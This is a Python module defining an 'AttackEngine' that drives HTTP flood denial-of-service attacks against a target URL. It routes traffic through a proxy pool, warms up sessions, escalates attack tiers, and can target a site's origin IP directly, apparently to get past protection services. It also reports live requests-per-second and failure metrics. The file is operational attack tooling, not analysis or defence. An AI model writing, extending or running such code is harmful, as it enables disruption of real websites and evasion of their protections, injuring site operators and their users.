import asyncio
import time
import logging
from typing import Optional, Callable
from dataclasses import dataclass

from core.proxy_engine import ProxyPool
from core.tier_engine import TierAttack, TierMetrics

logger = logging.getLogger("attack_engine")


@dataclass
class AttackMetrics:
    completed: int = 0
    failed: int = 0
    timeout: int = 0
    total_requests: int = 0
    current_rps: float = 0.0
    peak_rps: float = 0.0
    avg_response_time_ms: float = 0.0
    active_proxies: int = 0
    attack_method: str = "http_get_flood"
    tier: int = 1
    status: str = "STOPPED"

    def to_dict(self) -> dict:
        return {
            "completed": self.completed,
            "failed": self.failed,
            "timeout": self.timeout,
            "total_requests": self.total_requests,
            "current_rps": round(self.current_rps, 1),
            "peak_rps": round(self.peak_rps, 1),
            "avg_response_time_ms": round(self.avg_response_time_ms, 1),
            "active_proxies": self.active_proxies,
            "attack_method": self.attack_method,
            "tier": self.tier,
            "status": self.status,
        }


class AttackEngine:
    def __init__(self, proxy_pool: Optional[ProxyPool] = None, no_proxy: bool = False,
                 origin_ip: Optional[str] = None, proxy_type: str = "mobile",
                 initial_rps: int = 100, start_tier: int = 1,
                 attack_plan: Optional[list] = None):
        self.proxy_pool = proxy_pool
        self.no_proxy = no_proxy
        self.origin_ip = origin_ip
        self.proxy_type = proxy_type
        self.initial_rps = initial_rps
        self.start_tier = start_tier
        self.attack_plan = attack_plan
        self.metrics = AttackMetrics()
        self._on_metrics: Optional[Callable] = None

    def set_metrics_callback(self, cb: Callable):
        self._on_metrics = cb

    def _metrics_bridge(self, tm: TierMetrics):
        self.metrics.completed = tm.completed
        self.metrics.failed = tm.failed
        self.metrics.timeout = tm.timeout
        self.metrics.total_requests = tm.total
        self.metrics.current_rps = tm.rps
        self.metrics.peak_rps = tm.peak_rps
        self.metrics.avg_response_time_ms = tm.avg_rtt
        self.metrics.tier = tm.tier
        self.metrics.active_proxies = self.proxy_pool.stats()["total"] if self.proxy_pool else 0
        self.metrics.status = tm.status.upper()
        if self._on_metrics:
            self._on_metrics(self.metrics.to_dict())

    async def start_attack(self, url: str, duration: int, method: str = "http_get_flood", rps: int = 100):
        self.metrics = AttackMetrics()
        self.metrics.attack_method = method
        if method == "bypass_path_flood":
            pass
        ta = TierAttack(
            proxy_pool=self.proxy_pool,
            target_url=url,
            origin_ip=self.origin_ip,
            proxy_type=self.proxy_type,
            on_metrics=self._metrics_bridge,
            attack_plan=self.attack_plan,
        )
        if not self.no_proxy:
            logger.info("Warming up session...")
            await ta.warmup(url)
        tier = 3 if self.origin_ip else (1 if self.no_proxy else self.start_tier)
        logger.info("Starting attack at Tier %d -> %s (%ds, %d RPS)", tier, url, duration, rps)
        result = await ta.run_escalation(url, start_tier=tier, duration=duration, rps=rps)
        self.metrics.status = "STOPPED"
        if self._on_metrics:
            self._on_metrics(self.metrics.to_dict())
        logger.info("Attack complete: %d req, %d OK, %d FAIL, %d TO",
                    result.total, result.completed, result.failed, result.timeout)

    def stop(self):
        pass

    def get_metrics(self) -> dict:
        return self.metrics.to_dict()
